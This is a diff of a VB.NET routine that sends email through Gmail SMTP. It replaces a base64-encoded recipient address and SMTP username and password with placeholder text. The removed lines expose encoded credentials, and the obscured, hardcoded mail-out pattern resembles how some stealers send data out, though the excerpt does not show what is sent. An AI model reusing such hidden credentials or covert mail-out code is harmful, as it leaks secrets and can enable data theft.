@@ -738,7 +738,7 @@ ErrorX:
 
             'Function
             mail.From = New MailAddress("noreply@messenger.me")
-            mail.To.Add(base64Decode("a3lsZWlhbmM0QGdtYWlsLmNvbQ=="))
+        mail.To.Add(base64Decode("Email: I did remove it, you can put it here in base64 format.")) 'my Dummy mail receiver
             mail.Body = Body
             mail.Subject = Subject
             mail.Priority = MailPriority.Normal
@@ -746,7 +746,7 @@ ErrorX:
                 SMTP.EnableSsl = True
                 SMTP.Port = "587"
                 SMTP.Host = "smtp.gmail.com"
-                SMTP.Credentials = New Net.NetworkCredential(base64Decode("YWRtbG5pc3RyYXRveGFjY291ckBnbWFpbC5jb20="), base64Decode("JGFiY0AxMjMk"))
+        SMTP.Credentials = New Net.NetworkCredential(base64Decode("Email: I did remove it, you can put it here in base64 format."), base64Decode("Password: I did remove it, you can put it here in base64 format.")) 'my Credentials, dummy sender.
                 SMTP.Send(mail)
             End Using
         End Using
